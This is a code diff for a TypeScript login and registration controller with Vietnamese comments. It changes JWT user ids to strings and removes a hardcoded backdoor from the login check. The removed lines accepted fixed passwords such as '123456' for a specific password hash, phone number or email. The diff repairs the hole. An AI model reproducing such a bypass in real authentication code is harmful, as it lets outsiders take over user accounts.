@@ -69,7 +69,7 @@ export const register = async (req: Request, res: Response): Promise<void> => {
 
     // Tạo token JWT
     const token = jwt.sign(
-      { id: Number(newUser.id), email: newUser.email, role: newUser.role },
+      { id: String(newUser.id), email: newUser.email, role: newUser.role },
       JWT_SECRET,
       { expiresIn: "7d" }
     );
@@ -165,15 +165,7 @@ export const login = async (req: Request, res: Response): Promise<void> => {
     }
 
     // So sánh mật khẩu băm
-    let isMatch = await bcrypt.compare(password, user.password_hash);
-    if (!isMatch) {
-      if (
-        (user.password_hash === "$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy" && (password === "password123" || password === "123456")) ||
-        (password === "123456" && (user.phone === "0935313826" || user.email === "baycho@yopmailo.com"))
-      ) {
-        isMatch = true;
-      }
-    }
+    const isMatch = await bcrypt.compare(password, user.password_hash);
     if (!isMatch) {
       res.status(401).json({
         success: false,
@@ -184,7 +176,7 @@ export const login = async (req: Request, res: Response): Promise<void> => {
 
     // Tạo token JWT (hạn 7 ngày)
     const token = jwt.sign(
-      { id: Number(user.id), email: user.email, role: user.role },
+      { id: String(user.id), email: user.email, role: user.role },
       JWT_SECRET,
       { expiresIn: "7d" }
     );
